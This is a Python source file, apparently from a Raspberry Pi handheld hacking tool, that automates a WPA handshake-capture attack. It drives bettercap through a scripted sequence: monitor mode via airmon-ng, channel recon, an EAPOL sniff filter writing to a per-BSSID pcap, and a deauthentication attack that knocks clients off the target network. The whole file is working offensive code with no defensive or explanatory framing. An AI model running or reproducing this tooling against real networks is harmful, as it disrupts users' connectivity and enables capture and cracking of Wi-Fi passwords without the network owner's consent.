from lib.mojstd import *
import RPi.GPIO as GPIO
import os
import subprocess
import time


bk_ = 0

class CapHandshakes():
    def __init__(self, INTERFACE):
        self.INTERFACE = INTERFACE
        self.bettercap_process = subprocess.Popen(
            ['sudo', 'bettercap', '-iface', f'{INTERFACE}'],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1
        )

    def bk(self):
        if GPIO.input(KEY3_PIN) == 0:
            return True

    def interface_select(self, INTERFACE):
        test = os.popen(f"iwconfig {self.INTERFACE} ")
        out = test.read()


        if "No such device" in out:
            return 1

        else:
            pass
            return 0

    def interface_start(self, INTERFACE):
        time.sleep(0.5)
        os.system(f"sudo airmon-ng start {INTERFACE}")
        if self.bk() == True:
            return 1
        else:
            return 0

    def initialization(self, selected_chan, selected_bssid, INTERFACE):
        bk_ = 0
        commands = [
            'wifi.recon on',
            'wifi.show',
            f'set wifi.recon channel {selected_chan}',
            'set net.sniff.verbose true',
            'set net.sniff.filter ether proto 0x888e',
            f'set net.sniff.output /home/kali/mojito/wpa_{selected_bssid}_.pcap',
            'net.sniff on',
            f'wifi.deauth {selected_bssid}'
        ]

        messages = [
            "Starting Recon...",
            "Examining Networks...",
            "Setting Channel...",
            "Setting Verbose...",
            "Setting Filter...",
            "Setting Output...",
            "Starting Sniff...",
            "Deauthing..."
        ]

        self.__init__(self.INTERFACE)
        time.sleep(0.5)
        for i in commands:

            #key3
            if self.bk() == True:
                killwhile = 1
                return killwhile
                break

            time.sleep(2)
            ui_print(f"Loading ({commands.index(i)})", 0.5)
            self.bettercap_process.stdin.write(i+'\n')

            #key3
            if self.bk() == True:
                killwhile = 1
                return killwhile
                break

            self.bettercap_process.stdin.flush()
            ui_print(messages[commands.index(i)], 1)

            #Write output
            with open("/kali/home/mojito/logs/output.txt", 'a') as file:
                file.write(self.bettercap_process.stdout.readline())

        return 0
